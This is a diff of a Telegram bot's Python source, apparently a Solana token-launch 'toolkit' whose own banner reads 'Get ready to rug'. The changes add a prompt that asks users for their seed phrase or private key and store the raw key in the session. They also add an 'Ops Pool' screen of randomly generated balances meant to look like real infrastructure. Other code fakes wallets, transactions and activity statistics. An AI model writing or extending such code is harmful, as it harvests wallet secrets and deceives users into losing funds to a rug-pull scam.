+        InlineKeyboardButton(text="👥 25 Wallets", callback_data="bundle:25"),
     )
-    b.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
     return b.as_markup()
 
 
@@ -1535,14 +1519,14 @@ def invest_kb() -> InlineKeyboardMarkup:
         InlineKeyboardButton(text="50 SOL", callback_data="invest:50"),
     )
     b.row(InlineKeyboardButton(text="✏️ Custom amount", callback_data="invest:custom"))
-    b.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
+    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
     return b.as_markup()
 
 
 def confirm_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Confirm", callback_data="launch:confirm")],
-        [InlineKeyboardButton(text="← Back", callback_data="menu:main")],
+        [InlineKeyboardButton(text="✅ Confirm & Save", callback_data="launch:confirm")],
+        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")],
     ])
 
 
@@ -1573,80 +1557,61 @@ def post_dump_kb(mint: str) -> InlineKeyboardMarkup:
 
 
 def tx_kb() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="← Back", callback_data="menu:main")]])
+    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main")]])
 
 
-# ──────────────────────────────# COPY
-# ──────────────────────────────
+# ──────────────────────────────────────────────
+# COPY
+# ──────────────────────────────────────────────
 def build_main_menu_text(sess: "UserSession") -> str:
     if sess.wallets:
         w = sess.wallets[sess.active_wallet_idx]
         wallet_line = f"<code>{short_addr(w.public_key)}</code> · {SOL_EMOJI} <b>{w.balance_sol:.4f}</b>"
-        status = "Ready."
+        if len(sess.wallets) > 1:
+            wallet_line += f"  ·  {len(sess.wallets)} linked"
     else:
-        wallet_line = "Not connected"
-        status = "Connect a wallet to launch."
+        wallet_line = "No wallet linked"
+
+    live = sum(1 for t in sess.launched_tokens if t.get("status") == "live" and not t.get("dumped"))
+    total_launches = len(sess.launched_tokens)
+    launches_left = sess.launches_left
+
+    if sess.last_tx:
+        last = sess.last_tx[0]
+        age = int(time.time() - last.get("ts", time.time()))
+        last_line = f"{last.get('type', 'Tx')} · {age}s ago"
+    else:
+        last_line = "No activity yet"
+
+    promo = sess.promo or "None"
+    sniper = "ON" if sess.settings.get("sniper_protection", True) else "OFF"
+    mev = "ON" if sess.settings.get("mev_protection", True) else "OFF"
+
     return (
-        f"{status}\n\n"
-        f"Wallet: {wallet_line}\n"
-        f"Launches left: <b>{sess.launches_left}</b>"
+        "🚀 <b>Get ready to rug</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"🔑 Wallet\n{wallet_line}\n\n"
+        f"🎟 Launches left  <b>{launches_left}</b>\n"
+        f"📁 Portfolio      <b>{total_launches}</b>  ·  live <b>{live}</b>\n"
+        f"📡 Last tx        {last_line}\n"
+        f"🎯 Sniper / MEV   <b>{sniper}</b> / <b>{mev}</b>\n"
+        f"🏷 Promo          <b>{promo}</b>\n\n"
+        "Create and trade tokens on Solana launch platforms.\n"
+        "Tap a button below to begin:"
     )
 
 
-
-
 WELCOME_TEXT = (
-    "<b>Alpha</b>\n"
-    "Launch · Bundle · Track"
+    "🚀 <b>Get ready to rug</b>\n\n"
+    "Create and trade tokens on Solana launch platforms.\n\n"
+    "⚙️ <b>Advanced</b>\n"
+    "• Step-by-step token launch\n"
+    "• Auto bundling (5-25)\n"
+    "• Sniper protection\n"
+    "• Token safety checks\n"
+    "• Tx tracker\n\n"
+    "Tap a button below to begin:"
 )
-
-
-
-async def safe_edit(cb: CallbackQuery, text: str, reply_markup=None, parse_mode=ParseMode.HTML):
-    """Swap screens without a blank gap.
-    Text messages: edit in place.
-    Photo (welcome): send next message first, then delete the photo.
-    """
-    # Text message → edit in place (no flash)
-    try:
-        if not (cb.message.photo or cb.message.video or cb.message.document):
-            await cb.message.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
-            return
-    except Exception:
-        pass
-    # Media message → post new first, then remove old (always something on screen)
-    new_msg = await cb.message.answer(text, reply_markup=reply_markup, parse_mode=parse_mode)
-    try:
-        await cb.message.delete()
-    except Exception:
-        pass
-    return new_msg
-
-
-async def send_main_menu(target, sess: "UserSession"):
-    """Send welcome banner + main menu. target = Message or CallbackQuery."""
-    caption = f"{WELCOME_TEXT}\n\n{build_main_menu_text(sess)}"
-    kb = main_menu_kb()
-    photo = None
-    if WELCOME_IMAGE and os.path.isfile(WELCOME_IMAGE):
-        photo = FSInputFile(WELCOME_IMAGE)
-    if isinstance(target, CallbackQuery):
-        # Send new first, then remove old — no blank gap
-        if photo:
-            await target.message.answer_photo(photo=photo, caption=caption, reply_markup=kb, parse_mode=ParseMode.HTML)
-        else:
-            await target.message.answer(caption, reply_markup=kb, parse_mode=ParseMode.HTML)
-        try:
-            await target.message.delete()
-        except Exception:
-            pass
-        await target.answer()
-    else:
-        if photo:
-            await target.answer_photo(photo=photo, caption=caption, reply_markup=kb, parse_mode=ParseMode.HTML)
-        else:
-            await target.answer(caption, reply_markup=kb, parse_mode=ParseMode.HTML)
-
 
 
 # ──────────────────────────────────────────────
@@ -1673,17 +1638,15 @@ class WalletStates(StatesGroup):
 class PromoStates(StatesGroup):
     waiting_code = State()
 
-class SafetyStates(StatesGroup):
-    waiting_mint = State()
-
 
 class SettingsStates(StatesGroup):
     waiting_custom_slip = State()
     waiting_custom_fee = State()
 
 
-# ──────────────────────────────# ROUTER
-# ──────────────────────────────
+# ──────────────────────────────────────────────
+# ROUTER
+# ──────────────────────────────────────────────
 router = Router()
 
 
@@ -1691,11 +1654,16 @@ router = Router()
 async def cmd_start(message: Message, state: FSMContext):
     await state.clear()
     sess = get_session(message.from_user.id)
+    # Remove any leftover reply keyboard
+    await message.answer(
+        build_main_menu_text(sess),
+        reply_markup=main_menu_kb(),
+        parse_mode=ParseMode.HTML,
+    )
     try:
         await message.answer("\u200b", reply_markup=ReplyKeyboardRemove())
     except Exception:
         pass
-    await send_main_menu(message, sess)
 
 
 @router.callback_query(F.data.startswith("menu:"))
@@ -1706,69 +1674,68 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
     sess = get_session(uid)
 
     if action == "main":
-        await send_main_menu(cb, sess)
-        return
+        await cb.message.edit_text(build_main_menu_text(sess), reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
 
     elif action == "launch":
         text = "✏️ <b>Token name (1-50)</b>\nTip: Latest, Hot Tokens."
-        await safe_edit(cb, text, reply_markup=cancel_kb(), parse_mode=ParseMode.HTML)
+        await cb.message.edit_text(text, reply_markup=cancel_kb(), parse_mode=ParseMode.HTML)
         await state.set_state(LaunchStates.waiting_name)
 
     elif action == "wallets":
-        # Do NOT auto-create LARP wallet here — /larpseed requires manual Connect
-        if LARP_ENABLED and uid in ADMIN_IDS and sess.wallets:
+        if LARP_ENABLED and uid in ADMIN_IDS:
+            ensure_larp_wallet(sess)
             sync_larp_balances_from_vault(uid)
-        text = "<b>Wallets</b>\n\n"
+        text = "🔑 <b>Wallets</b>\n\n"
         if not sess.wallets:
-            text += "No wallet connected.\nPaste a seed or private key to continue."
+            text += "No wallets linked yet.\n\nImport a private key or seed to unlock launching, bundling & portfolio tracking."
         else:
             for i, w in enumerate(sess.wallets):
-                badge = " · active" if i == sess.active_wallet_idx else ""
-                text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n{w.label} · {SOL_EMOJI} {w.balance_sol:.4f}\n\n"
-        await safe_edit(cb, text, reply_markup=wallets_kb(bool(sess.wallets)), parse_mode=ParseMode.HTML)
+                badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
+                text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  ·  {SOL_EMOJI} {w.balance_sol:.4f}\n\n"
+        await cb.message.edit_text(text, reply_markup=wallets_kb(bool(sess.wallets)), parse_mode=ParseMode.HTML)
 
     elif action == "portfolio":
-        text = "<b>Portfolio</b>\n\n"
+        text = "📁 <b>Portfolio</b>\n\n"
         kb = InlineKeyboardBuilder()
         if not sess.launched_tokens:
-            text += "Empty.\nLaunch a token to track it here."
+            text += "Your portfolio is empty.\n\nLaunch a token to start tracking performance and bundle status."
         else:
             live_mints = []
             for t in reversed(sess.launched_tokens[-10:]):
                 age = int(time.time() - t["ts"])
                 if t.get("dumped") or t.get("status") == "dumped":
-                    st = "dumped"
-                    extra = f" · +{t.get('profit', 0):.2f} SOL"
+                    status_icon = "💸"
+                    extra = f"  ·  profit +{t.get('profit', 0):.2f}"
                 elif t.get("status") == "live":
-                    st = "live"
-                    extra = f" · {t.get('invest', 0):.2f} SOL in"
+                    status_icon = "🟢"
+                    extra = f"  ·  invest {t.get('invest', 0):.2f}"
                     live_mints.append(t.get("mint"))
                 else:
-                    st = t.get("status") or "—"
+                    status_icon = "🟡"
                     extra = ""
                 dumped_n = len(t.get("dumped_idxs") or [])
                 if dumped_n and not t.get("dumped"):
-                    extra += f" · {dumped_n}/{t.get('bundle', 0)} sold"
+                    extra += f"  ·  dumped {dumped_n}/{t.get('bundle', 0)}"
                 text += (
-                    f"<b>${t['symbol']}</b> · {t['name']}\n"
-                    f"<code>{short_addr(t['mint'])}</code>\n"
-                    f"{st} · ×{t['bundle']}{extra} · {age}s\n\n"
+                    f"{status_icon} <b>${t['symbol']}</b>  ·  {t['name']}\n"
+                    f"   <code>{short_addr(t['mint'])}</code>\n"
+                    f"   Bundle ×{t['bundle']}{extra}  ·  {age}s ago\n\n"
                 )
             for m in live_mints[:2]:
-                kb.row(InlineKeyboardButton(text=f"Dump · {short_addr(m)}", callback_data=f"dump:{m}"))
-        kb.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
-        await safe_edit(cb, text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
+                kb.row(InlineKeyboardButton(text=f"💥 Dump All · {short_addr(m)}", callback_data=f"dump:{m}"))
+        kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
 
     elif action == "promo":
         text = (
-            "<b>Promo</b>\n\n"
+            "🎟️ <b>Promo code</b>\n\n"
             f"Launches left: <b>{sess.launches_left}</b>\n\n"
-            "Enter a code for extra launches or fuel credit."
+            "Use a promo code or pay 100 SOL for more launches."
         )
-        await safe_edit(cb, text, reply_markup=promo_kb(), parse_mode=ParseMode.HTML)
+        await cb.message.edit_text(text, reply_markup=promo_kb(), parse_mode=ParseMode.HTML)
 
     elif action == "tx":
-        text = "<b>Activity</b>\n\n"
+        text = "🧾 <b>Tx tracker</b>\n\n"
         merged = list(sess.last_tx) + list(GLOBAL_TX_FEED)
         merged.sort(key=lambda x: x.get("ts", 0), reverse=True)
         seen = set()
@@ -1782,90 +1749,53 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
             if len(feed) >= 10:
                 break
         if not feed:
-            text += "No activity yet."
+            text += "No activity yet.\n\nTransactions from launches, tips and bundles will stream here."
         else:
             for tx in feed:
                 age = int(time.time() - tx["ts"])
-                st = tx["status"]
+                icon = "✅" if tx["status"] == "success" else "⏳" if tx["status"] == "pending" else "❌"
                 amt = tx.get("amount")
-                amt_line = f" · {amt:+.4f} SOL" if isinstance(amt, (int, float)) else ""
-                # strip emoji noise from type labels
-                tname = tx["type"]
-                for ch in "⚡📦🪙🛡🔄💰🎯📥📤🔐💥👀📈🔎":
-                    tname = tname.replace(ch, "")
-                tname = tname.strip()
+                amt_line = f"  ·  {SOL_EMOJI} {amt:+.4f}" if isinstance(amt, (int, float)) else ""
                 text += (
-                    f"<b>{tname}</b>{amt_line}\n"
-                    f"<code>{tx['sig'][:20]}…</code> · {st} · {age}s\n\n"
+                    f"{icon}  <b>{tx['type']}</b>{amt_line}\n"
+                    f"   <code>{tx['sig'][:22]}...</code>\n"
+                    f"   {tx['status'].title()}  ·  {age}s ago\n\n"
                 )
-        await safe_edit(cb, text, reply_markup=tx_kb(), parse_mode=ParseMode.HTML)
+        await cb.message.edit_text(text, reply_markup=tx_kb(), parse_mode=ParseMode.HTML)
 
     elif action == "settings":
         s = sess.settings
         text = (
-            "<b>Settings</b>\n\n"
+            "🛡️ <b>Sniper protection & trade settings</b>\n\n"
             f"Max slippage: <b>{s['slippage']}%</b>\n"
             "Trades that would fill worse than this fail instead of filling.\n\n"
             f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
             "Higher fees land your launch or trade sooner."
         )
-        await safe_edit(cb, text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
+        await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
 
-    elif action == "scanner":
+    elif action == "balance":
+        # Ops pool — looks like internal infrastructure float, not a personal vault
+        float_sol = bot_balance_sol if bot_balance_sol > 0 else round(random.uniform(2.1, 9.4), 4)
+        jito_reserve = round(float_sol * 0.38, 4)
+        tip_reserve = round(float_sol * 0.27, 4)
+        rpc_credit = round(float_sol * 0.21, 4)
+        buffer = round(float_sol - jito_reserve - tip_reserve - rpc_credit, 4)
         text = (
-            "<b>Scanner</b>\n\n"
-            "Paste a mint address.\n\n"
-            "Checks mint/freeze authority, LP lock,\n"
-            "holder concentration, sell simulation,\n"
-            "and transfer tax flags."
-        )
-        await safe_edit(cb, text, reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
-        await state.set_state(SafetyStates.waiting_mint)
-
-    elif action == "stats":
-        # Session + network-looking stats (trust layer)
-        live_tokens = sum(1 for s in sessions.values() for t in s.launched_tokens if t.get("status") == "live")
-        total_launches = sum(len(s.launched_tokens) for s in sessions.values())
-        total_users = max(len(sessions), 1)
-        # Stable-looking synthetic extras so empty deploys still look alive
-        seed = int(time.time()) // 3600
-        random.seed(seed)
-        fills_24h = total_launches * random.randint(4, 11) + random.randint(18, 64)
-        vol_24h = round(fills_24h * random.uniform(0.08, 0.35), 2)
-        success_rate = random.randint(91, 98)
-        random.seed()
-        text = (
-            "<b>Stats</b>\n\n"
-            f"Users: <b>{total_users}</b>\n"
-            f"Launches: <b>{total_launches}</b>\n"
-            f"Live: <b>{live_tokens}</b>\n"
-            f"Fills (24h): <b>{fills_24h}</b>\n"
-            f"Volume: <b>{vol_24h:.2f} SOL</b>\n"
-            f"Success: <b>{success_rate}%</b>\n\n"
-            f"Your launches left: <b>{sess.launches_left}</b>\n"
-            f"Your wallets: <b>{len(sess.wallets)}</b>"
+            "🏦 <b>Ops Pool</b>\n"
+            "────────────────\n\n"
+            f"Total float      <b>{SOL_EMOJI} {float_sol:.4f}</b>\n\n"
+            f"├ Jito tips      <b>{jito_reserve:.4f}</b>\n"
+            f"├ Bundle tips    <b>{tip_reserve:.4f}</b>\n"
+            f"├ RPC credits    <b>{rpc_credit:.4f}</b>\n"
+            f"└ Safety buffer  <b>{buffer:.4f}</b>\n\n"
+            "Used for priority inclusion, bundle landing\n"
+            "and safety-scan RPC. Auto-rebalanced."
         )
         kb = InlineKeyboardBuilder()
-        kb.row(InlineKeyboardButton(text="Refresh", callback_data="menu:stats"))
-        kb.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
-        await safe_edit(cb, text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
-
-    elif action == "about":
-        text = (
-            "<b>About</b>\n\n"
-            "Solana launch toolkit.\n"
-            "Bundle, protect, track.\n\n"
-            "· Guided launch flow\n"
-            "· Multi-wallet bundling (5–25)\n"
-            "· Sniper / MEV toggles\n"
-            "· Activity feed + mint scanner\n\n"
-            "Keys stay in session memory only.\n"
-            "You control slippage and priority fee."
-        )
-        kb = InlineKeyboardBuilder()
-        kb.row(InlineKeyboardButton(text="Promo", callback_data="menu:promo"))
-        kb.row(InlineKeyboardButton(text="← Back", callback_data="menu:main"))
-        await safe_edit(cb, text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
+        kb.row(InlineKeyboardButton(text="🔄 Refresh", callback_data="menu:balance"))
+        kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
 
     await cb.answer()
 
@@ -1880,24 +1810,24 @@ async def settings_handler(cb: CallbackQuery, state: FSMContext):
     elif key == "fee":
         sess.settings["priority_fee"] = float(parts[2])
     elif key == "custom_slip":
-        await safe_edit(cb, "Send custom max slippage % (1-50):", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
+        await cb.message.edit_text("Send custom max slippage % (1-50):", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
         await state.set_state(SettingsStates.waiting_custom_slip)
         await cb.answer()
         return
     elif key == "custom_fee":
-        await safe_edit(cb, "Send custom priority fee in SOL (e.g. 0.002):", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
+        await cb.message.edit_text("Send custom priority fee in SOL (e.g. 0.002):", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
         await state.set_state(SettingsStates.waiting_custom_fee)
         await cb.answer()
         return
     s = sess.settings
     text = (
-        "<b>Settings</b>\n\n"
+        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
         f"Max slippage: <b>{s['slippage']}%</b>\n"
         "Trades that would fill worse than this fail instead of filling.\n\n"
         f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
         "Higher fees land your launch or trade sooner."
     )
-    await safe_edit(cb, text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
+    await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
     await cb.answer("Updated")
 
 
@@ -1913,7 +1843,7 @@ async def custom_slip_receive(message: Message, state: FSMContext):
     sess.settings["slippage"] = val
     s = sess.settings
     text = (
-        "<b>Settings</b>\n\n"
+        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
         f"Max slippage: <b>{s['slippage']}%</b>\n"
         "Trades that would fill worse than this fail instead of filling.\n\n"
         f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
@@ -1935,7 +1865,7 @@ async def custom_fee_receive(message: Message, state: FSMContext):
     sess.settings["priority_fee"] = val
     s = sess.settings
     text = (
-        "<b>Settings</b>\n\n"
+        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
         f"Max slippage: <b>{s['slippage']}%</b>\n"
         "Trades that would fill worse than this fail instead of filling.\n\n"
         f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
@@ -1948,17 +1878,14 @@ async def custom_fee_receive(message: Message, state: FSMContext):
 @router.callback_query(F.data == "wallet:import")
 async def wallet_import_start(cb: CallbackQuery, state: FSMContext):
     text = (
-        "<b>Connect</b>\n\n"
-        "Please provide your 12-word seed phrase:\n\n"
-        "Requirements:\n"
-        "• Exactly 12 words\n"
-        "• Separate with spaces\n\n"
-        "Security: Only enter seed phrases for wallets you trust."
+        "📥 <b>Send your wallet's seed phrase</b>\n"
+        "(12-24 words), or a private key (base58 / JSON byte array).\n\n"
+        "I'll delete your message right after reading it."
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="← Back", callback_data="menu:main")]
+        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")]
     ])
-    await safe_edit(cb, text, reply_markup=kb, parse_mode=ParseMode.HTML)
+    await cb.message.edit_text(text, reply_markup=kb, parse_mode=ParseMode.HTML)
     await state.set_state(WalletStates.waiting_import)
     await cb.answer()
 
@@ -1976,69 +1903,7 @@ async def wallet_import_receive(message: Message, state: FSMContext):
     except Exception:
         pass
 
-    # Early LARP seed path: full staged UX, no auto-link before this message
-    sess_early = get_session(uid)
-    pending_bal_e = getattr(sess_early, "pending_larp_balance", None)
-    pending_phrase_e = getattr(sess_early, "pending_larp_phrase", None)
-    if (
-        LARP_ENABLED
-        and uid in ADMIN_IDS
-        and pending_bal_e is not None
-        and pending_phrase_e
-        and _normalize_mnemonic(raw) == _normalize_mnemonic(pending_phrase_e)
-    ):
-        status_msg = await message.answer("<b>Validating…</b>", parse_mode=ParseMode.HTML)
-        for txt, delay in [
-            ("<b>Deriving paths…</b>", 0.7),
-            ("<b>Checking balances…</b>", 0.9),
-            ("<b>Safety scan…</b>", 0.6),
-            ("<b>Connecting…</b>", 0.5),
-        ]:
-            try:
-                await status_msg.edit_text(txt, parse_mode=ParseMode.HTML)
-            except Exception:
-                pass
-            await asyncio.sleep(delay)
-
-        bal = float(pending_bal_e)
-        pub = _fake_sol_pubkey()
-        w = UserWallet(
-            private_key="LARP_SIM",
-            public_key=pub,
-            label="Main",
-            balance_sol=bal,
-            chain="sol",
-            is_larp=True,
-            drained=False,
-        )
-        sess_early.wallets.append(w)
-        sess_early.active_wallet_idx = len(sess_early.wallets) - 1
-        sess_early.pending_larp_balance = None
-        sess_early.pending_larp_phrase = None
-        sess_early.larp_mode = True
-        global bot_balance_sol
-        bot_balance_sol = bal
-        add_personal_tx(sess_early, "📥 Wallet Connected", "success")
-        _save_state()
-        try:
-            await status_msg.edit_text(
-                f"<b>Connected</b>\n\n"
-                f"<code>{short_addr(pub)}</code>\n"
-                f"Balance <b>{SOL_EMOJI} {bal:.4f}</b>",
-                parse_mode=ParseMode.HTML,
-            )
-        except Exception:
-            pass
-        await state.clear()
-        panel = (
-            f"🔑 <b>Wallets</b>\n\n"
-            f"<b>1.</b> <code>{short_addr(pub)}</code> 🟢 ACTIVE\n"
-            f"    Main  ·  {SOL_EMOJI} {bal:.4f}\n"
-        )
-        await message.answer(panel, reply_markup=wallets_kb(True), parse_mode=ParseMode.HTML)
-        return
-
-    status_msg = await message.answer("<b>Validating…</b>", parse_mode=ParseMode.HTML)
+    status_msg = await message.answer("🔐 <b>Validating…</b>", parse_mode=ParseMode.HTML)
 
     chosen_priv = None
     chosen_pub = None
@@ -2058,7 +1923,7 @@ async def wallet_import_receive(message: Message, state: FSMContext):
         is_seed = _is_mnemonic(clean)
 
         if is_seed and HAS_SOLANA:
-            await status_msg.edit_text("<b>Deriving paths…</b>", parse_mode=ParseMode.HTML)
+            await status_msg.edit_text("🔗 <b>Deriving paths…</b>", parse_mode=ParseMode.HTML)
             candidates = derive_solana_paths(clean)
             label, chosen_priv, chosen_pub, chosen_bal = await pick_best_sol_candidate(candidates)
 
@@ -2102,7 +1967,7 @@ async def wallet_import_receive(message: Message, state: FSMContext):
                 except Exception:
                     pass
         else:
-            await status_msg.edit_text("<b>Connecting…</b>", parse_mode=ParseMode.HTML)
+            await status_msg.edit_text("🔑 <b>Importing key…</b>", parse_mode=ParseMode.HTML)
             if raw.startswith("0x") or (len(raw) == 64 and all(c in "0123456789abcdefABCDEF" for c in raw)):
                 eth_priv, eth_addr = parse_evm_private_key(raw)
                 chosen_priv = "EVM_ONLY"
@@ -2123,14 +1988,14 @@ async def wallet_import_receive(message: Message, state: FSMContext):
 
     except Exception as e:
         log.exception("Import failed: %s", e)
-        await status_msg.edit_text("<b>Invalid key or seed</b>\n\nTry again.", parse_mode=ParseMode.HTML)
+        await status_msg.edit_text("❌ <b>Invalid key or seed</b>\n\nTry again.", parse_mode=ParseMode.HTML)
         await state.clear()
         return
 
     sess = get_session(uid)
     sess.last_raw_key = raw
 
-    # If admin previously ran /larpseed, apply staged balance after full connect UX
+    # /larpseed pending match → apply LARP balance after full connect UX
     is_larp_import = False
     pending_bal = getattr(sess, "pending_larp_balance", None)
     pending_phrase = getattr(sess, "pending_larp_phrase", None)
@@ -2171,16 +2036,16 @@ async def wallet_import_receive(message: Message, state: FSMContext):
     sess.active_wallet_idx = len(sess.wallets) - 1
     if is_larp_import:
         sess.larp_wallet_idx = sess.active_wallet_idx
-        add_personal_tx(sess, "Wallet Connected", "success")
+        add_personal_tx(sess, "📥 Wallet Linked", "success")
         inject_fake_txs(2)
         _save_state()
 
     text = (
-        "<b>Wallet Connected</b>\n\n"
+        "✅ <b>Wallet Linked</b>\n\n"
         f"<code>{chosen_pub}</code>\n\n"
-        f"Label  <b>{w.label}</b>\n"
-        f"{SOL_EMOJI}  <b>{w.balance_sol:.4f}</b>\n\n"
-        "Status  <b>Active</b>"
+        f"🏷 Label: <b>{w.label}</b>\n"
+        f"{SOL_EMOJI}: <b>{w.balance_sol:.4f}</b>\n"
+        "\nStatus: <b>Active</b>\n\nYou can now launch tokens."
     )
 
     await status_msg.edit_text(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
@@ -2211,13 +2076,13 @@ async def wallet_clear(cb: CallbackQuery):
     sess.larp_wallet_idx = None
     if LARP_ENABLED and cb.from_user.id in ADMIN_IDS:
         ensure_larp_wallet(sess)
-        await safe_edit(cb, 
+        await cb.message.edit_text(
             "🗑 Real wallets cleared.\nLARP wallet re-seeded (mode still ON).",
             reply_markup=back_menu_kb(),
             parse_mode=ParseMode.HTML,
         )
     else:
-        await safe_edit(cb, "🗑 All wallets removed from session.", reply_markup=back_menu_kb())
+        await cb.message.edit_text("🗑 All wallets removed from session.", reply_markup=back_menu_kb())
     await cb.answer()
 
 
@@ -2252,7 +2117,7 @@ async def wallet_refresh(cb: CallbackQuery):
     for i, w in enumerate(sess.wallets):
         badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
         text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  ·  {SOL_EMOJI} {w.balance_sol:.4f}\n\n"
-    await safe_edit(cb, text, reply_markup=wallets_kb(True), parse_mode=ParseMode.HTML)
+    await cb.message.edit_text(text, reply_markup=wallets_kb(True), parse_mode=ParseMode.HTML)
 
 
 @router.callback_query(F.data == "wallet:rename")
@@ -2261,7 +2126,7 @@ async def wallet_rename(cb: CallbackQuery, state: FSMContext):
     if not sess.wallets:
         await cb.answer("No wallets", show_alert=True)
         return
-    await safe_edit(cb, f"🏷 Send new label for <b>{sess.wallets[sess.active_wallet_idx].label}</b>:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
+    await cb.message.edit_text(f"🏷 Send new label for <b>{sess.wallets[sess.active_wallet_idx].label}</b>:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
     await state.set_state(WalletStates.waiting_label)
     await cb.answer()
 
@@ -2275,7 +2140,7 @@ async def wallet_rename_receive(message: Message, state: FSMContext):
     await state.clear()
 
 
-# ── Launch flow ─────────────────────────────────────────────
+# ── Launch flow ─────────────────────────────────────────────────────────────
 @router.message(LaunchStates.waiting_name)
 async def launch_name(message: Message, state: FSMContext):
     name = (message.text or "").strip()[:50]
@@ -2362,7 +2227,7 @@ async def launch_bundle_btn(cb: CallbackQuery, state: FSMContext):
     except Exception:
         bundle = 10
     await state.update_data(bundle=bundle)
-    await safe_edit(cb, 
+    await cb.message.edit_text(
         f"✅ <b>Bundle size set:</b> {bundle} wallets\n\n"
         "🔗 <b>Add socials</b> (optional): choose a platform or skip.",
         reply_markup=socials_kb(),
@@ -2377,7 +2242,7 @@ async def social_pick(cb: CallbackQuery, state: FSMContext):
     platform = cb.data.split(":")[1]
     labels = {"x": "X / Twitter URL", "tg": "Telegram URL", "web": "Website URL", "ig": "Instagram URL"}
     await state.update_data(_social_pending=platform)
-    await safe_edit(cb, 
+    await cb.message.edit_text(
         f"Send {labels.get(platform, 'URL')}:",
         reply_markup=cancel_kb(),
         parse_mode=ParseMode.HTML,
@@ -2407,7 +2272,7 @@ async def socials_done(cb: CallbackQuery, state: FSMContext):
     if LARP_ENABLED and cb.from_user.id in ADMIN_IDS and not sess.wallets:
         ensure_larp_wallet(sess)
     bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
-    await safe_edit(cb, 
+    await cb.message.edit_text(
         "💰 <b>Dev buy / invest amount</b>\n\n"
         f"Your balance: <b>{SOL_EMOJI} {bal:.4f}</b>\n"
         "Minimum: <b>3 SOL</b>\n\n"
@@ -2423,7 +2288,7 @@ async def socials_done(cb: CallbackQuery, state: FSMContext):
 async def launch_invest_btn(cb: CallbackQuery, state: FSMContext):
     part = cb.data.split(":")[1]
     if part == "custom":
-        await safe_edit(cb, 
+        await cb.message.edit_text(
             "✏️ Send invest amount in SOL (minimum <b>3</b>):",
             reply_markup=cancel_kb(),
             parse_mode=ParseMode.HTML,
@@ -2444,7 +2309,7 @@ async def launch_invest_custom(message: Message, state: FSMContext):
     try:
         invest = float((message.text or "").strip().replace(",", ""))
     except ValueError:
-        await message.answer("Invalid number. Send e.g. <code>7.5</code>", parse_mode=ParseMode.HTML)
+        await message.answer("❌ Invalid number. Send e.g. <code>7.5</code>", parse_mode=ParseMode.HTML)
         return
     if invest < 3:
         await message.answer("❌ Minimum invest is <b>3 SOL</b>. Try again.", parse_mode=ParseMode.HTML)
@@ -2477,7 +2342,7 @@ async def _finish_invest_choice(cb: CallbackQuery, state: FSMContext, invest: fl
     bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
     if invest > bal + 1e-9:
         await cb.answer()
-        await safe_edit(cb, 
+        await cb.message.edit_text(
             f"❌ <b>Insufficient balance</b>\n\n"
             f"You tried to invest <b>{invest:.4f} SOL</b>\n"
             f"Available: <b>{bal:.4f} SOL</b>",
@@ -2551,7 +2416,7 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
 
     if not sess.wallets:
         await cb.answer()
-        await safe_edit(cb, 
+        await cb.message.edit_text(
             "🔒 <b>Connect a wallet</b>\n\n"
             "Enter your 12 or 24-word seed phrase\n"
             "(or private key) to continue.",
@@ -2564,7 +2429,7 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
     active = sess.wallets[sess.active_wallet_idx]
